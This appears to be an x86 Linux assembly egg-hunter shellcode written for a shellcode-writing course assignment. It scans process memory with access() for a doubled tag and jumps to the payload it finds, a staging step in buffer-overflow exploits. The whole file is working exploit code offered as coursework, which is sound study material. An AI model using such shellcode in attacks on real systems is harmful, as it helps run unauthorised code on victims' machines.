; Author: John Stigerwalt 
; SLAE: Assignment #3
; Website: slae.whiteknightlabs.com/wordpress
; Reference: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf 

global _start

section .text
_start:

mov ebx, 0x50905091
xor ecx, ecx
mul ecx  ; zero out eax and edx

next_page:
    or dx, 0xfff            ; add 4095

next_addr:
    inc edx                 ; edx = 4096 (0x1000) No 0x00's
    pushad                  ; push registers on stack
    lea ebx, [edx+0x4]      ; compares edx and edx+0x4
    mov al, 0x21            ; access sys-call
    int 0x80                ; execute access()
    
    cmp al, 0xf2            ; compare for -14 (0xfffffff2)
    popad                   ; restore registers
    jz next_page

    cmp [edx], ebx          ; check for first egg tag
    jnz next_addr
    
    cmp [edx+4], ebx        ; check for second egg tag
    jne next_addr           ; loop back around if not found

    jmp edx                 ; execute shellcode
